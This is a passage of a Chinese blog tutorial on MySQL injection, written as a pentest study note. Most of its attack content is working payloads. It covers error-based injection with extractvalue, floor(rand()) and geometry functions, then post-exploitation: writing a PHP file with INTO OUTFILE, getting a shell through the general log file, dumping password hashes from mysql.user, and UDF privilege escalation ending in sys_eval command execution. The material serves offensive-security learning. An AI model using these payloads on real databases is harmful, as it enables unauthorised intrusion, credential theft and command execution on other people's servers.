+<p>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
+<p>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p>
+<p>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><p>限制条件5.0 , 5.1 , 5.5</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这两个x是别名,a也是别名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from (select count(*),concat(DATABASE(),floor(rand(0)*2))x from information_schema.tables group by concat(DATABASE(),floor(rand(0)*2)))a</span><br></pre></td></tr></table></figure>
+
+
+
+<p>rand()就是从0到1随机一个数</p>
+<p>floor()就是向下取整</p>
+<p>经过测试发现floor(rand(0)<em>2))是一个伪随机数</em>，开头是011011，所以concat(DATABASE(),floor(rand(0)*2) 会重复</p>
+<p>这个时候漏洞就出现了</p>
+<p><strong>mysql官方注明，在执行group by语句的时候，group by语句后面的字段会被运算两次。</strong></p>
+<p><strong>第一次是group by后面的字段和虚拟表进行对比，第二次是插入时会进行运算。</strong></p>
+<p>原理</p>
+<p><strong>1.floor(rand(0)*2)进行第一次运算，floor&#x3D;0，此时为floor与虚拟表进行对比，由于表中没有值，进行插入。</strong></p>
+<p><strong>2、插入时，floor进行第二次运算，floor&#x3D;1，插入1，count&#x3D;1。</strong></p>
+<p><strong>3、取floor&#x3D;1，此时为floor与虚拟表进行对比，由于存在floor&#x3D;1，故count+1。</strong></p>
+<p><strong>4、插入0时，floor进行第二次运算，floor&#x3D;0已经存在，无法进行插入操作，故产生主键重复错误，抛出异常。</strong></p>
+<p>SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x  group by x </p>
+<p>那么上面这个就能够成功了，但是显然不是，因为这个只会返回一个数据，我要多次的插入才会报错，所以加上from information_schema.tables，select 1 from 会返回和数据一样多的1，</p>
+<p>SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x from information_schema.tables  group by x</p>
+<p>ok这个时候成功一大半了，我们要让他执行就要加上 1&#x3D;（SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x from information_schema.tables  group by x）</p>
+<p>但是这个不行，我们用select 1 from (SELECT count(*), CONCAT(database(),FLOOR(RAND(0)*2))x from information_schema.tables  group by x)a ,记得加上a</p>
+<p>在做多表查询，或者查询的时候产生新的表的时候会出现这个错误：Every derived table must have its own alias（每一个派生出来的表都必须有一个自己的别名）</p>
+<h3 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection"></a>geometrycollection</h3><p>5.5以下</p>
+<p>select geometrycollection((select * from(select * from(查询语句)a)b))</p>
+<h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h3><p>5.5以下</p>
+<p>select polygon((select * from(select * from(查询语句)a)b))</p>
+<h3 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint"></a>multipoint</h3><p>5.5以下</p>
+<p>select multipoint((select * from(select * from(操作码)a)b))</p>
+<h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring"></a>multilinestring</h3><p>5.5以下</p>
+<p>select multilinestring((select * from(select * from(操作码)a)b))</p>
+<h3 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon"></a>multipolygon</h3><p>5.5以下</p>
+<p>select multipolygon((select * from(select * from(操作码)a)b))</p>
+<h3 id="linestring"><a href="#linestring" class="headerlink" title="linestring"></a>linestring</h3><p>5.5以下</p>
+<p>select linestring((select * from(select * from(操作码)a)b))</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>5.5以下</p>
+<p>select exp(~(select * from (操作码) a))</p>
+<h3 id="ST-LatFromGeoHash"><a href="#ST-LatFromGeoHash" class="headerlink" title="ST_LatFromGeoHash"></a>ST_LatFromGeoHash</h3><p>select ST_LatFromGeoHash(version());</p>
+<h3 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST_LongFromGeoHash"></a>ST_LongFromGeoHash</h3><p> select ST_LongFromGeoHash(version())</p>
+<h3 id="GTID-SUBSET"><a href="#GTID-SUBSET" class="headerlink" title="GTID_SUBSET"></a>GTID_SUBSET</h3><p>select GTID_SUBSET(version(),1)</p>
+<h3 id="GTID-SUBTRACT"><a href="#GTID-SUBTRACT" class="headerlink" title="GTID_SUBTRACT"></a>GTID_SUBTRACT</h3><p>select GTID_SUBTRACT(version(),1)</p>
+<h3 id="ST-PointFromGeoHash"><a href="#ST-PointFromGeoHash" class="headerlink" title="ST_PointFromGeoHash"></a>ST_PointFromGeoHash</h3><p>5.7到5.6</p>
+<p>select ST_PointFromGeoHash(version(),1)</p>
+<h2 id="拿下mysql后"><a href="#拿下mysql后" class="headerlink" title="拿下mysql后"></a>拿下mysql后</h2><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>先看看什么版本</p>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NULL</td>
+<td>不允许导入或导出</td>
+</tr>
+<tr>
+<td>&#x2F;tmp</td>
+<td>只允许在 &#x2F;tmp 目录导入导出</td>
+</tr>
+<tr>
+<td>空</td>
+<td>不限制目录</td>
+</tr>
+</tbody></table>
+<p>如果可以写的话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php phpinfo(); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h3><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Variable_name</th>
+<th align="left">Value</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">general_log</td>
+<td align="left">OFF</td>
+<td></td>
+</tr>
+<tr>
+<td align="left">general_log_file</td>
+<td align="left">C:\Users\guo\Desktop\general.log</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
+<p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> global general_log_file=<span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| Variable_name    | Value                       |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| general_log      | ON                          |</span><br><span class="line">| general_log_file | /var/www/html/info.php |</span><br><span class="line">+------------------+-----------------------------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 往日志里面写入 payload</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># MySQL <span class="operator">&lt;=</span> <span class="number">5.6</span> 版本</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> host, <span class="keyword">user</span>, password <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> host      <span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> password                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> localhost <span class="operator">|</span> root <span class="operator">|</span> <span class="operator">*</span><span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">|</span> root <span class="operator">|</span> <span class="operator">*</span><span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ::<span class="number">1</span>       <span class="operator">|</span> root <span class="operator">|</span> <span class="operator">*</span><span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">%</span>         <span class="operator">|</span> root <span class="operator">|</span> <span class="operator">*</span><span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------+-------------------------------------------+</span></span><br><span class="line"></span><br><span class="line"># MySQL <span class="operator">&gt;=</span> <span class="number">5.7</span> 版本</span><br><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> host,<span class="keyword">user</span>,authentication_string <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> host      <span class="operator">|</span> <span class="keyword">user</span>          <span class="operator">|</span> authentication_string                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> localhost <span class="operator">|</span> root          <span class="operator">|</span> <span class="operator">*</span><span class="number">8232</span>A1298A49F710DBEE0B330C42EEC825D4190A <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> localhost <span class="operator">|</span> mysql.session <span class="operator">|</span> <span class="operator">*</span>THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> localhost <span class="operator">|</span> mysql.sys     <span class="operator">|</span> <span class="operator">*</span>THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------------+-------------------------------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="原理简介："><a href="#原理简介：" class="headerlink" title="原理简介："></a>原理简介：</h3><p>MySQL 支持通过 C&#x2F;C++ 编写的 <strong>UDF 动态库（.dll 或 .so 文件）</strong>，将其注册为数据库函数并使用。</p>
+<p>如果你拥有：</p>
+<ul>
+<li>数据库的 <strong>FILE 权限</strong>（可写文件）；</li>
+<li>能将 <strong>恶意 UDF 动态库写入插件目录</strong>；</li>
+<li>或者绕过 <code>secure_file_priv</code> 写到任意路径；</li>
+<li>能执行 <code>CREATE FUNCTION</code> 注册函数；</li>
+</ul>
+<p>那么你就可以：</p>
+<p>👉 <strong>执行系统命令</strong>，如 <code>net user</code>、<code>whoami</code>、<code>cmd.exe /c powershell</code> 等。</p>
+<h3 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Variable_name</th>
+<th align="left">Value</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">default_authentication_plugin</td>
+<td align="left">mysql_native_password</td>
+<td></td>
+</tr>
+<tr>
+<td align="left">plugin_dir</td>
+<td align="left">C:\wenjian\phpstudy\phpstudy_pro\Extensions\MySQL5…</td>
+<td></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">@@basedir</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">C:\wenjian\phpstudy\phpstudy_pro\Extensions\MySQL5…</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>或者找到安装目录</p>
+<h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><p>上传恶意编译的 <code>udf.dll</code> 到插件目录</p>
+<ol>
+<li>我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sql# 直接 SELECT 查询十六进制写入</span><br><span class="line">SELECT 0x7f454c4602... INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.dll&#x27;;</span><br><span class="line"></span><br><span class="line"># 解码十六进制再写入多此一举</span><br><span class="line">SELECT unhex(&#x27;7f454c4602...&#x27;) INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>创建函数绑定到 DLL 中的命令执行函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>执行系统命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">查询语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">绕过手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E6%B3%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">构造函数法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">逗号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.</span> <span class="toc-text">注释符号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.3.4.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4or-and-xor-not-%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.5.</span> <span class="toc-text">过滤or and xor not 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7-%E6%88%96%E5%A4%A7%E5%B0%8F%E4%BA%8E%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.6.</span> <span class="toc-text">过滤等号&#x3D;或大小于号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.7.</span> <span class="toc-text">过滤函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-mid"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">substr mid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii-ord"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">ascii ord</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#left-right"><span class="toc-number">1.3.7.4.</span> <span class="toc-text">left right</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97"><span class="toc-number">1.4.</span> <span class="toc-text">逻辑运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#if"><span class="toc-number">1.5.</span> <span class="toc-text">if</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-number">1.6.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.6.2.</span> <span class="toc-text">extractvalue</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#floor"><span class="toc-number">1.7.</span> <span class="toc-text">floor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#geometrycollection"><span class="toc-number">1.7.1.</span> <span class="toc-text">geometrycollection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#polygon"><span class="toc-number">1.7.2.</span> <span class="toc-text">polygon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multipoint"><span class="toc-number">1.7.3.</span> <span class="toc-text">multipoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multilinestring"><span class="toc-number">1.7.4.</span> <span class="toc-text">multilinestring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multipolygon"><span class="toc-number">1.7.5.</span> <span class="toc-text">multipolygon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linestring"><span class="toc-number">1.7.6.</span> <span class="toc-text">linestring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.7.7.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LatFromGeoHash"><span class="toc-number">1.7.8.</span> <span class="toc-text">ST_LatFromGeoHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LongFromGeoHash"><span class="toc-number">1.7.9.</span> <span class="toc-text">ST_LongFromGeoHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-SUBSET"><span class="toc-number">1.7.10.</span> <span class="toc-text">GTID_SUBSET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-SUBTRACT"><span class="toc-number">1.7.11.</span> <span class="toc-text">GTID_SUBTRACT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-PointFromGeoHash"><span class="toc-number">1.7.12.</span> <span class="toc-text">ST_PointFromGeoHash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8Bmysql%E5%90%8E"><span class="toc-number">1.8.</span> <span class="toc-text">拿下mysql后</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.8.1.</span> <span class="toc-text">写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99-shell"><span class="toc-number">1.8.2.</span> <span class="toc-text">日志文件写 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-%E8%8E%B7%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86"><span class="toc-number">1.8.3.</span> <span class="toc-text">Hash 获取与解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">1.9.</span> <span class="toc-text">udf提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.9.1.</span> <span class="toc-text">原理简介：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">1.9.2.</span> <span class="toc-text">寻找插件目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-number">1.9.3.</span> <span class="toc-text">写入动态链接库</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&text=mysql注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&is_video=false&description=mysql注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql注入&body=Check out this article: http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&title=mysql注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&name=mysql注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/06/02/mysql%E6%B3%A8%E5%85%A5/&t=mysql注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2003-2025
+    Mouri-Kogorou
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Writing</a></li><!--
+    --><!--
+      --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
